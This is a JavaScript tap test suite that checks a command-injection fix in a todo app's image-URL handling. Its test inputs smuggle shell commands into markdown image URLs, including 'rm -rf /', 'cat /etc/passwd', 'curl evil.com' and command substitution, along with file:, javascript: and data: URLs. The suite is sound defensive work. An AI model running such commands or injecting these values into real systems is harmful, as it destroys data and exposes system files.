const tap = require('tap');
const childProcess = require('child_process');

// Store original functions
const originalExecFile = childProcess.execFile;
const originalConsoleLog = console.log;

// Test suite for Command Injection vulnerability remediation
tap.test('Command Injection Prevention in Todo Creation', function (t) {
  let execFileCalls = [];
  let consoleLogCalls = [];
  let mongoose, routes, Todo;

  // Setup mock before loading the module
  t.before(function () {
    // Mock execFile before requiring the routes module
    childProcess.execFile = function (command, args, callback) {
      execFileCalls.push({ command, args, callback });
      // Simulate successful execution
      if (callback) {
        process.nextTick(function () {
          callback(null, '', '');
        });
      }
    };

    // Mock console.log to capture logs
    console.log = function (...args) {
      consoleLogCalls.push(args);
    };

    // Mock mongoose and Todo model
    mongoose = require('mongoose');

    // Create a simple mock for Todo model if it doesn't exist or mock it
    const TodoSchema = new mongoose.Schema({
      content: String,
      updated_at: Date
    });

    // Override the save method
    TodoSchema.methods.save = function (callback) {
      process.nextTick(function () {
        callback(null, { content: 'test' }, 1);
      });
    };

    // Try to register the model (will fail if already registered, which is fine)
    try {
      mongoose.model('Todo', TodoSchema);
    } catch (e) {
      // Model already exists, get it
      Todo = mongoose.model('Todo');
    }

    // Now require routes after mocks are in place
    routes = require('../routes/index.js');
  });

  // Cleanup after all tests
  t.teardown(function () {
    childProcess.execFile = originalExecFile;
    console.log = originalConsoleLog;
  });

  // Reset tracking arrays before each test
  t.beforeEach(function () {
    execFileCalls = [];
    consoleLogCalls = [];
  });

  t.test('should use execFile with array arguments for valid URL', function (t) {
    // GIVEN: Valid markdown image with HTTP URL
    const mockReq = {
      body: { content: '![alt text](http://example.com/image.jpg "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should be called with separate arguments
      t.equal(execFileCalls.length, 1, 'execFile should be called once');
      t.equal(execFileCalls[0].command, 'identify', 'command should be "identify"');
      t.ok(Array.isArray(execFileCalls[0].args), 'arguments should be an array');
      t.equal(execFileCalls[0].args[0], 'http://example.com/image.jpg', 'URL should be first array element');
      t.equal(execFileCalls[0].args.length, 1, 'should have exactly one argument');
      t.end();
    }, 50);
  });

  t.test('should block command injection with semicolon', function (t) {
    // GIVEN: Malicious input with semicolon command separator
    const mockReq = {
      body: { content: '![alt text](http://example.com/image.jpg; rm -rf / "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for invalid URL');

      // Check that invalid URL message was logged
      const invalidUrlLog = consoleLogCalls.find(function (call) {
        return call[0] && call[0].includes && call[0].includes('Invalid URL format');
      });
      t.ok(invalidUrlLog, 'should log invalid URL message');
      t.end();
    }, 50);
  });

  t.test('should block command injection with pipe operator', function (t) {
    // GIVEN: Malicious input with pipe operator
    const mockReq = {
      body: { content: '![alt text](http://example.com/image.jpg | cat /etc/passwd "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for pipe injection');
      t.end();
    }, 50);
  });

  t.test('should block command injection with ampersand', function (t) {
    // GIVEN: Malicious input with ampersand command chaining
    const mockReq = {
      body: { content: '![alt text](http://example.com/image.jpg && curl evil.com "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for ampersand injection');
      t.end();
    }, 50);
  });

  t.test('should block command injection with backticks', function (t) {
    // GIVEN: Malicious input with backtick command substitution
    const mockReq = {
      body: { content: '![alt text](http://example.com/`whoami`.jpg "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for backtick injection');
      t.end();
    }, 50);
  });

  t.test('should block command injection with dollar sign substitution', function (t) {
    // GIVEN: Malicious input with $() command substitution
    const mockReq = {
      body: { content: '![alt text](http://example.com/$(whoami).jpg "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for $() injection');
      t.end();
    }, 50);
  });

  t.test('should reject URLs without protocol', function (t) {
    // GIVEN: URL missing http/https protocol
    const mockReq = {
      body: { content: '![alt text](example.com/image.jpg "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called without protocol');
      t.end();
    }, 50);
  });

  t.test('should reject file protocol URLs', function (t) {
    // GIVEN: file:// protocol URL (local file system access attempt)
    const mockReq = {
      body: { content: '![alt text](file:///etc/passwd "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for file:// protocol');
      t.end();
    }, 50);
  });

  t.test('should accept valid HTTPS URL', function (t) {
    // GIVEN: Valid HTTPS URL
    const mockReq = {
      body: { content: '![alt text](https://secure.example.com/image.png "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should be called correctly
      t.equal(execFileCalls.length, 1, 'execFile should be called for valid HTTPS URL');
      t.equal(execFileCalls[0].command, 'identify', 'command should be identify');
      t.equal(execFileCalls[0].args[0], 'https://secure.example.com/image.png', 'HTTPS URL should be passed');
      t.end();
    }, 50);
  });

  t.test('should handle URL with query parameters safely', function (t) {
    // GIVEN: Valid URL with query parameters
    const mockReq = {
      body: { content: '![alt text](http://example.com/image.jpg?size=large&format=png "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should be called with full URL as single argument
      t.equal(execFileCalls.length, 1, 'execFile should be called');
      t.equal(execFileCalls[0].args[0], 'http://example.com/image.jpg?size=large&format=png',
              'URL with query params should be single argument');
      t.equal(execFileCalls[0].args.length, 1, 'should pass URL as single array element');
      t.end();
    }, 50);
  });

  t.test('should not call execFile for regular todo content', function (t) {
    // GIVEN: Regular todo item without image
    const mockReq = {
      body: { content: 'Buy groceries' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for non-image content');
      t.end();
    }, 50);
  });

  t.test('should block FTP protocol', function (t) {
    // GIVEN: FTP protocol URL
    const mockReq = {
      body: { content: '![alt text](ftp://example.com/file.jpg "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for FTP protocol');
      t.end();
    }, 50);
  });

  t.test('should block javascript protocol', function (t) {
    // GIVEN: javascript: protocol (XSS attempt)
    const mockReq = {
      body: { content: '![alt text](javascript:alert(1) "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for javascript: protocol');
      t.end();
    }, 50);
  });

  t.test('should block data protocol', function (t) {
    // GIVEN: data: protocol URL
    const mockReq = {
      body: { content: '![alt text](data:text/html,<script>alert(1)</script> "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called
      t.equal(execFileCalls.length, 0, 'execFile should not be called for data: protocol');
      t.end();
    }, 50);
  });

  t.test('should prevent shell metacharacter exploitation via newline', function (t) {
    // GIVEN: Malicious input with newline character
    const mockReq = {
      body: { content: '![alt text](http://example.com/image.jpg\nrm -rf / "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: execFile should NOT be called due to invalid URL
      t.equal(execFileCalls.length, 0, 'execFile should not be called with newline injection');
      t.end();
    }, 50);
  });

  t.test('should validate that execFile receives exactly one argument', function (t) {
    // GIVEN: Valid URL
    const mockReq = {
      body: { content: '![alt text](http://example.com/test.jpg "title")' }
    };
    const mockRes = {
      setHeader: function () {},
      status: function () { return this; },
      send: function () {}
    };
    const mockNext = function () {};

    // WHEN: create endpoint is called
    routes.create(mockReq, mockRes, mockNext);

    // Allow async operations to complete
    setTimeout(function () {
      // THEN: verify the arguments array has exactly one element
      t.equal(execFileCalls.length, 1, 'execFile should be called');
      t.ok(Array.isArray(execFileCalls[0].args), 'args should be an array');
      t.equal(execFileCalls[0].args.length, 1, 'args array should have exactly one element');
      t.type(execFileCalls[0].args[0], 'string', 'argument should be a string');
      t.end();
    }, 50);
  });

  t.end();
});
